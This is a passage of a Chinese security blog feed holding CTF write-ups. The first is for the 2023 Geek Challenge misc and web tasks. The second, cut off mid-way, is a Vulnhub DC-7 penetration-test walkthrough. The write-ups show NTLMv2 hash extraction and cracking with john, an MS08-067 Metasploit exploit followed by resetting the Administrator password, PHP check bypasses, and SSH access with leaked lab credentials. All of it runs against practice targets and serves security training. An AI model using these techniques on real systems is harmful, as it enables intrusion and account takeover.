解码</p><pre><code>NAME_o2takuXX&#125;</code></pre><p>现在两部分flag就全了</p><pre><code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></pre><p>但其实还是需要练习一下写脚本的能力</p><p>根据前面文字中的第10条放大缩小  猜测需要将原图片缩小10倍</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202200110895.png" alt="image-20231202200110895"></p><p>查看原图片像素为(3300,1800) 那么缩小10倍就是(330,180)</p><p>写脚本</p><pre><code class="python">from PIL import Imageimg = Image.open(&quot;kamisama.png&quot;)size = img.sizesmall_size = (int(size[0] / 10), int(size[1] / 10))img_small = img.resize(small_size, Image.NEAREST)img_small.save(&quot;flag.png&quot;)</code></pre><p><font color='red'>这里要注意 要使用PIL库中缩放图片算法中的<code>NEAREST</code>模式</font></p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><p>第一部分看到动态图 一眼拼图 先把webp动态图转换为gif图<a href="https://cloudconvert.com/">webp转gif</a> 在分帧</p><p> 使用montage拼图 gaps恢复顺序</p><pre><code>montage ./*.png -tile 40x22 -geometry +0+0 flag.pnggaps --image=flag.png --generations=200 --size=48 --save</code></pre><p>拼的不是特别完美 但是可以看出是base64编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626538.png" alt="image-20231103091126052"></p><p>拿到后半部分flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231103091207601.png" alt="image-20231103091207601"></p><pre><code>_14_Ki114R&#125;</code></pre><p>后面的音频 一听就是慢扫描电视 把后半部分提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626543.png" alt="image-20231103092040221"></p><p>使用工具将图片扫出来 得到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626684.png" alt="image-20231103092106149"></p><pre><code>SYC&#123;H4xr0t0r</code></pre><h3 id="DEATH-N2TE-gif分帧-图片放缩-像素拼接"><a href="#DEATH-N2TE-gif分帧-图片放缩-像素拼接" class="headerlink" title="DEATH-N2TE(gif分帧 图片放缩 像素拼接)"></a>DEATH-N2TE(gif分帧 图片放缩 像素拼接)</h3><pre><code>&quot;你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:&quot; &quot;[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名...]&quot;。 </code></pre><p>观察视频 可以看到很明显的竖列白色像素条经过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031228556.png" alt="image-20231203122830104"></p><p>首先对图片进行分帧 找个软件就行 分出192张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031217015.png" alt="image-20231203121724885"></p><p>和DEATH_N0TE一样 先写个脚本将这些图片缩小十倍 原图片每张是1920x1080 那缩小后就是192x108</p><pre><code class="python">from PIL import Imagefor i in range(1, 193):    img = Image.open(r&#39;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out/frame_&#123;&#125;.png&#39;.format(i))    size_small = (192,108)    img_small = img.resize(size_small, Image.NEAREST)    img_small.save(r&quot;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out\small\&#123;&#125;.png&quot;.format(i))</code></pre><p>然后在写脚本将这些像素点进行拼接即可</p><pre><code class="python">from PIL import Imageimg1 = Image.new(&quot;RGB&quot;, (192,108), 0)for i in range(1, 193):    img = Image.open(r&quot;E:\Desktop\比赛\2023极客大挑战\misc\DEATH_N2TE\out\small/&#123;&#125;.png&quot;.format(i))    img.convert(&quot;1&quot;)    for x in range(192):        if x+1 == i:            for y in range(108):                img1.putpixel((x,y),img.getpixel((x,y)))img1.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031936544.png" alt="image-20231203193625446"></p><h3 id="xqr-图片等比例放大缩小-图片异或"><a href="#xqr-图片等比例放大缩小-图片异或" class="headerlink" title="xqr(图片等比例放大缩小 图片异或)"></a>xqr(图片等比例放大缩小 图片异或)</h3><p>给了一张二维码 扫一下 是false flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201203621826.png" alt="image-20231201203621826"></p><p>在这张二维码的后面 还有一个图片 提取出来</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201204635440.png" alt="image-20231201204635440"></p><p>看起来也是一张二维码 但是没有四个定位点 猜测需要异或 wp中说直接放在ps中 使用差值模式就可以得到反向flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626867.png" alt="image-20231201205048854"></p><p>扫码就可以得到flag</p><p>这个方法有点抽象 这边使用另一个方法 通过观察发现 原图片像素为75x75 分离出来的图片像素是25x25 刚好是原图片的1&#x2F;3</p><p>写个脚本 先将分离出来的图片等比例放大到75x75的像素</p><pre><code class="python">from PIL import Imageimg_input = Image.open(&quot;1.png&quot;) # 打开图片size_origin = img_input.size    # 读取像素size_big = (int(size_origin[0]*3), int(size_origin[1]*3))  # 扩大像素img_big = img_input.resize(size_big, Image.LANCZOS) # 创建新图片 new_size = (75, 75)new_img = Image.new(&quot;RGBA&quot;, new_size, (255,255,255))  # 创建新画布position = ((new_size[0] - size_big[0]) // 2, (new_size[1] - size_big[1]) // 2) # 确保新图片在新画布中心new_img.paste(img_big, position)           # 将新图片放在新画布上new_img.save(&quot;0.png&quot;)  # 保存图片</code></pre><p>在写脚本 将两张图片异或</p><pre><code class="python">from PIL import Imageimport numpyimg1 = Image.open(&quot;0.png&quot;)img2 = Image.open(&quot;xqr.png&quot;)array1 = numpy.array(img1)array2 = numpy.array(img2)xor_result = numpy.bitwise_xor(array1, array2)  # 对两张图片的像素进行逐位异或result_img = Image.fromarray(xor_result)        # 从NumPy数组创建新图像result_img.save(&quot;flag.png&quot;)</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201215744925.png" alt="image-20231201215744925"></p><p>扫码即可</p><h3 id="extractme-压缩包crc32爆破"><a href="#extractme-压缩包crc32爆破" class="headerlink" title="extractme(压缩包crc32爆破)"></a>extractme(压缩包crc32爆破)</h3><p>打开压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626559.png" alt="image-20231202194137644"></p><p>发现每个文件都很小 且大小一样 给出了crc32校验值 想到crc32爆破</p><p>写个脚本 循环爆破一下</p><pre><code class="python">from binascii import crc32import stringcrc_values = [0x8712de1d, 0x06eacbd7, 0x20a8e291, 0x31ee3074, 0x77aacf7f, 0x35fb7c6c, 0xf978d5aa, 0x016f7a0b]char_set = string.printableflag = dict(zip(crc_values, [None]*len(crc_values)))  # 创建一个字典flag zip函数将两个列表中的元素一一配对 字典中的键是crc_values中的值 键对应的值是Nonefor a in char_set:    for b in char_set:        for c in char_set:            for d in char_set:                s = a + b + c + d                crc_result = crc32(bytes(s, &#39;ascii&#39;)) &amp; 0xffffffff  # 计算字符串s的crc32值                if crc_result in crc_values:                    print(s, hex(crc_result))                    flag[crc_result] = s        # 当crc_values的值和crc_result匹配上时 将字典flag中对应于CRC32值crc_result的项的值更新为字符串sprint(&#39;&#39;.join([str(_) for _ in flag.values()]))  # 使用列表推导式遍历 flag 字典的所有值 将每个值转化为字符串 使用join方法连接每个字符串形成一个单独的字符串# SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></pre><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><p>没玩出来 看官方wp说搜一个可以打开<code>data.win</code>文件的工具  <a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202195600301.png" alt="image-20231202195600301"></p><p>下好后 使用Undertalemodtool打开data.win 直接搜索flag 可以找到一段关于flag的代码和flag的base64值</p><pre><code>c20xbGVfMXNfQF9uMWNlX2dAbWU=sm1le_1s_@_n1ce_g@me</code></pre><h3 id="窃听风云-有NTLMv2散列的pcap文件"><a href="#窃听风云-有NTLMv2散列的pcap文件" class="headerlink" title="窃听风云(有NTLMv2散列的pcap文件)"></a>窃听风云(有NTLMv2散列的pcap文件)</h3><pre><code>题目描述：Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>参考文章 <a href="https://zhuanlan.zhihu.com/p/52882041">9步从pcap文件中提取并破解 NTLMv2 哈希</a></p><p>首先 看到流量包中有http协议 先导出一下HTTP</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626998.png" alt="image-20231202204849122"></p><p>在其中一个chat.txt文件中找到线索</p><pre><code>Boss: Jack, what&#39;s the matter with you? This year in HW, the red team used a weak password to log in to your account again!Jack: Sorry boss, but the password I set is already very long.Boss: Among the clues provided by the referee, it is said that your password is in a dictionary called rockyou.txt.gzJack: Okay, I&#39;ll modify it as soon as possibleBoss: Wait, are you still using that password?Jack: Yes, what&#39;s wrong?Boss: Damn, someone overheard our conversation. Exit the chat room immediately!</code></pre><p>大概意思是要我们找到Jack设置的弱密码 这个密码在rockyou.txt这个字典中还出现过</p><p>那提到rockyou.txt 肯定要想到爆破哈希密码了 本题就是NTLMv2哈希密码</p><p>那我们直接跟着参考文章中的步骤一点点找</p><p>1.先过滤ntlmssp字段 获得身份验证的握手包</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202210215044.png" alt="image-20231202210215044"></p><p>2.查找<code>NTLMSSP_AUTH</code>包  查看HTTP数据 看到用户名和域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626480.png" alt="image-20231202210435547"></p><pre><code>User name:jackHost name:CLIENT01</code></pre><p>3.找到NTProofStr字段和NTLMv2的响应部分</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202213216475.png" alt="image-20231202213216475"></p><pre><code>ntlmssp.ntlmv2_response.ntproofstr：2d1d24572b15fe544043431c59965d30ntlmssp.ntlmv2_response：2d1d24572b15fe544043431c59965d300101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>但是注意响应部分是以NTProofStr字段开头的 要将这部分删掉</p><p>4.过滤筛选出ntlmssp.ntlmserverchallenge 找到NTLM Server Challenge字段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626943.png" alt="image-20231202213540576"></p><pre><code>NTLM Server Challenge: 2af71b5ca7246268</code></pre><p>5.写hash文件</p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2responsejack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>6.使用hashcat或者john爆破密码</p><pre><code>john --wordlist=rockyou.txt --user=jack hash.txt out.txtjohn hash.txt -show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031129995.png" alt="image-20231203112929933"></p><p>所以泄漏的密码为</p><pre><code>iamjackpassword</code></pre><h3 id="窃听风云v2"><a href="#窃听风云v2" class="headerlink" title="窃听风云v2"></a>窃听风云v2</h3><pre><code>题目描述：这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>考的还是ntlm的hash 但是是被base64加密之后的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031955240.png" alt="image-20231203195518193"></p><p>在服务端返回250和235代码之间的包是认证的过程 从这几个包里面找和上一道题一样的hash</p><p>题目说是邮件 找SMTP流量 SMTP11包是认证成功的包 在这里解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031953720.png" alt="image-20231203195350638"></p><p>和上题一样 开始找hash内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032003432.png" alt="image-20231203200346363"></p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code></pre><pre><code>username: jackdomain: WidgetLLC.Internal</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010206.png" alt="image-20231203201020167"></p><pre><code>NTLM Server Challenge: 3e3966c8cacd29f7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010387.png" alt="image-20231203201052345"></p><pre><code>NTProofStr: ddd46fd8f78c262eae16918f66185497NTLMv2 Response: ddd46fd8f78c262eae16918f66185497010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><p>合在一起</p><pre><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><pre><code>john --wordlist=rockyou.txt hash1.txt out.txtjohn hash1.txt --show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032018282.png" alt="image-20231203201818216"></p><pre><code>jack100589barney</code></pre><p><a href="https://r0fus0d.blog.ffffffff0x.com/post/windows-authenticate/#ntlmv2">windows认证</a></p><h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><p>非预期解是直接解压vmdk文件 在文件中找 flag就在桌面壁纸中</p><pre><code>Tears_of_the_times-disk1.vmdk\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Wallpaper1.bmp</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022317301.png" alt="image-20231202231748947"></p><p>预期解就是小小的渗透一下</p><p>首先点击<code>Tears of the times.ovf</code> 将虚拟机导入vmware中 但是发现需要密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022324569.png" alt="image-20231202232444471"></p><p>使用kali攻击机 先扫一下靶机的ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p>扫出是<code>192.168.160.154</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022325444.png" alt="image-20231202232525386"></p><p>在进一步扫一下开放的端口</p><pre><code>nmap -T4 -sC -sV 192.168.160.154</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022326081.png" alt="image-20231202232625013"></p><p>也进一步证明了 我们扫出来的ip就是靶机ip</p><p>找一下windows xp系统经典漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332287.png" alt="image-20231202233209226"></p><p>里面提到的是<code>ms08-067</code>漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332564.png" alt="image-20231202233255495"></p><p>就找这个漏洞</p><pre><code>search ms08_067</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022335590.png" alt="image-20231202233538548"></p><pre><code>use 0set RHOST 192.168.160.154run shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022337221.png" alt="image-20231202233737168"></p><p>拿到shell之后 直接修改Administrator用户的密码</p><pre><code>net user administrator 123456</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022339217.png" alt="image-20231202233911179"></p><p>修改完毕 直接登陆 直接在桌面上看到flag了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626409.png" alt="image-20231202234000689"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><p>需要使用post传入username和password 随便传一个 然后抓包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281624351.png" alt="image-20231028162430309"></p><p>想到<code>robots.txt</code> 访问一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281626931.png" alt="image-20231028162605895"></p><p>在访问一下<code>/o2takuXX&#39;s_username_and_password.txt </code>得到username和password</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281932950.png" alt="image-20231028193242789"></p><p>使用正确的账号密码进行登陆 是对http请求头进行操作 分别是</p><pre><code>必须来源自sycsec.com请使用Syclover浏览器请使用Syc.vip代理</code></pre><p>对http请求头进行修改 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282131987.png" alt="image-20231028213106688"></p><p>对于最后一步</p><pre><code class="php">&lt;?phpif($_SERVER[&#39;HTTP_O2TAKUXX&#39;]==&quot;GiveMeFlag&quot;)&#123;    echo $flag;&#125;?&gt;</code></pre><p>就是要求http请求头中的<code>O2TAKUXX</code>字段的值要为<code>GiveMeFlag </code> 这里要注意在php中 所有http请求头中的内容前都会有<code>HTTP_</code>前缀 所以我们真实需要在http请求头中上传的参数是<code>O2TAKUXX</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282150349.png" alt="image-20231028215029154"></p><h3 id="easy-php-php绕过"><a href="#easy-php-php绕过" class="headerlink" title="easy_php(php绕过)"></a>easy_php(php绕过)</h3><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__FILE__);include_once(&#39;flag.php&#39;);if(isset($_GET[&#39;syc&#39;])&amp;&amp;preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;]) &amp;&amp; $_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;) &#123;    if (intval($_GET[&#39;lover&#39;]) &lt; 2023 &amp;&amp; intval($_GET[&#39;lover&#39;] + 1) &gt; 2024) &#123;        if (isset($_POST[&#39;qw&#39;]) &amp;&amp; $_POST[&#39;yxx&#39;]) &#123;            $array1 = (string)$_POST[&#39;qw&#39;];            $array2 = (string)$_POST[&#39;yxx&#39;];            if (sha1($array1) === sha1($array2)) &#123;                if (isset($_POST[&#39;SYC_GEEK.2023&#39;])&amp;&amp;($_POST[&#39;SYC_GEEK.2023&#39;]=&quot;Happy to see you!&quot;)) &#123;                    echo $flag;                &#125; else &#123;                    echo &quot;再绕最后一步吧&quot;;                &#125;            &#125; else &#123;                echo &quot;好哩，快拿到flag啦&quot;;            &#125;        &#125; else &#123;            echo &quot;这里绕不过去，QW可不答应了哈&quot;;        &#125;    &#125; else &#123;        echo &quot;嘿嘿嘿，你别急啊&quot;;    &#125;&#125;else &#123;    echo &quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;;&#125;?&gt; </code></pre><p>第一步  </p><pre><code>preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;])：这部分使用正则表达式来检查&#39;syc&#39;参数的值是否匹配模式&#39;/^Welcome to GEEK 2023!$/i&#39;。正则表达式中的&#39;i&#39;表示不区分大小写，也就是说，它会匹配值为&quot;Welcome to GEEK 2023!&quot;的任何大小写形式。$_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;是检查syc的值 需要完全不等于Welcome to GEEK 2023!因为preg_match的判断中不区分大小写 因此一个大小写绕过就行</code></pre><pre><code>?syc=wELCOME TO geek 2023!</code></pre><p>第二步</p><pre><code>intval()函数将参数的内容转化为整数 要求lover中的值小于2023但是加一之后大于2024根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值 因此使用科学计数法绕过即可</code></pre><pre><code>&amp;lover=1e6</code></pre><p>第三步</p><pre><code>上传两个参数qw和yxx 再将两个参数的值转化为字符串 传入array1和array2两个参数中非常简单 随便传</code></pre><p>第四步</p><pre><code>要求被赋值后的array1和array2经过sha1加密计算后的值相等在传入qw和yxx时 值相等即可</code></pre><pre><code>qw=0e1&amp;yxx=0e1</code></pre><p>第五步</p><pre><code>参数中存在小数点 会将其转化为下划线所以传参之后的参数就不是题目中要求的参数名了php的非法传参 在前面使用中括号替换掉第一个下划线即可</code></pre><pre><code>&amp;SYC[GEEK.2023=Happy to see you!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310291111005.png" alt="image-20231029111111902"></p><pre><code>SYC&#123;bgH2lFmnLIEkY1jIvl&#125; </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023极客大挑战&quot;&gt;&lt;a href=&quot;#2023极客大挑战&quot; class=&quot;headerlink&quot; title=&quot;2023极客大挑战&quot;&gt;&lt;/a&gt;2023极客大挑战&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-7</title>
    <link href="http://w3nx1z1.github.io/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/"/>
    <id>http://w3nx1z1.github.io/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/</id>
    <published>2024-03-31T13:03:08.545Z</published>
    <updated>2024-03-31T13:04:52.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-7"><a href="#vulnhub靶场DC-7" class="headerlink" title="vulnhub靶场DC-7"></a>vulnhub靶场DC-7</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.While this isn&#39;t an overly technical challenge, it isn&#39;t exactly easy.While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.What you will need to do, is to think &quot;outside&quot; of the box.Waaaaaay &quot;outside&quot; of the box. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这一段靶场描述 给我们的提示是 爆破&#x2F;字典攻击&#x2F;跳出框框(可能涉及到一些非常规的手段)</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042127114.png" alt="image-20240304212705072"></p><p>ip为<code>192.168.160.128</code>开放了22端口和80端口</p><p>在扫描具体的端口</p><pre><code>nmap -A -p- -v 192.168.160.128</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042129224.png" alt="image-20240304212919172"></p><pre><code>开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><p>扫一下网站目录 扫到登陆页面</p><pre><code>/user/login/</code></pre><p>在使用whatweb进行CMS识别 可以看到和DC-1一样 都是使用Drupal框架进行搭建的网站 版本是Drupal 8</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051512995.png" alt="image-20240305151232689"></p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042131490.png" alt="image-20240304213117378"></p><p>网站首页的内容</p><pre><code>DC-7 introduces some &quot;new&quot; concepts, but I&#39;ll leave you to figure out what they are.  :-)While this challenge isn&#39;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#39;t succeed.What you will have to do, is to think &quot;outside&quot; the box.Way &quot;outside&quot; the box.  :-)</code></pre><p>还是提醒我们这个靶场引入了一些新东西 如果进行爆破或者字典攻击，可能不会成功  需要跳出框框 找一些新方法</p><p>尝试用searchsploit和msfconsole搜索漏洞脚本 进行渗透 没有用 </p><p>上面也说了爆破或者字典攻击没有用  那也就不考虑在用户登录页面上做文章了</p><p>尝试在搜索页面进行命令注入 也没有用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051656848.png" alt="image-20240305165627743"></p><p>在主页面下面看到一个<code>@DC7USER</code>标识 搜一下 找到一个github账号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051657352.png" alt="image-20240305165740321"></p><p>里面有个员工数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051658003.png" alt="image-20240305165822938"></p><p>在<code>config.php</code> 里面找到了数据库登陆的账号和密码</p><pre><code class="php">&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><h3 id="三、远程登陆"><a href="#三、远程登陆" class="headerlink" title="三、远程登陆"></a>三、远程登陆</h3><p>使用这组账号密码可以直接ssh远程登录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312104079.png" alt="image-20240305170150430"></p><h3 id="四、修改网站后台登陆密码"><a href="#四、修改网站后台登陆密码" class="headerlink" title="四、修改网站后台登陆密码"></a>四、修改网站后台登陆密码</h3><p>当前文件夹为<code>/home/dc7user </code>  有一个backups文件夹和mbox文件  进入backups文件夹查看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052033496.png" alt="image-20240305203346429">                                                         </p><p>两个gpg文件 是加密的文件 没有密钥打不开 在看mbox文件 是一些root用户的操作记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052039102.png" alt="image-20240305203945043"></p><p>发现每隔15分钟 就会将执行一次<code>/opt/scripts/backups.sh</code> 这个文件  并且将数据库备份保存在<code>/home/dc7user/backups/website.sql</code>这个文件中 并使用gpg进行加密   我们看一下<code>backups.sh</code> 这个可执行文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052042403.png" alt="image-20240305204248369"></p><pre><code>逐条分析一下backups.sh里面执行的命令1.删除/home/dc7user/backups/ 下的所有文件2.进入cd /var/www/html/ 目录下3.使用drush命令 将/var/www/html/ 目录下的网站数据库进行备份 保存在/home/dc7user/backups/website.sql中其中Drush 是一种流行的用于管理 Drupal 站点的命令行工具。它提供了许多功能，包括备份数据库、安装模块、更新核心和模块等。4.回到上一级目录5.使用tar命令将/var/www/html/ 目录下所有文件进行打包 保存在/home/dc7user/backups/website.tar.gz中6.7.使用gpg命令对website.sql和websitge.sql.gz进行加密8.将 /home/dc7user/backups/ 目录下所有文件的所有权设置为 dc7user 用户和组。9.10.删除未加密的website.sql和website.sql.gz</code></pre><p>那么关键点就在于上面提到的drush这个命令  这个命令允许我们对Drupal框架搭建的网站的登陆密码进行修改 但是需要在网站的根目录下执行</p><p><a 